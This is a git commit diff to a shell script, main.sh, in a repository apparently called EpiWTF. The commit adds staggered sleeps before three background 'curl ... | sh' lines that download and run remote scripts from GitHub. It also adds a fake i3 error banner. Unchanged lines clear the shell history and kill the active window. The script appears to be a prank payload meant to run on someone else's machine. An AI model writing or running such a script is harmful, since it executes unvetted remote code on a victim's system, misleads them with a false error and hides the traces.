79dd810b252cdda7dd8f3c90312ab8f23a779369
Ilyann Gwinner <ilyann.gwinner@epita.fr>
2024-12-10 16:33:06 +0100

    add error in main

--- main.sh
+++ main.sh
@@ -1,6 +1,7 @@
-curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/loop.sh | sh &
-curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/notif.sh | sh &
-curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/img.sh |sh &
+sleep 30; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/loop.sh | sh &
+sleep 35; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/notif.sh | sh &
+sleep 5; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/img.sh |sh &
 
+i3-nagbar -t error -m "error with your %e=\\fe42' config" &
 history -c &
 i3-msg kill &
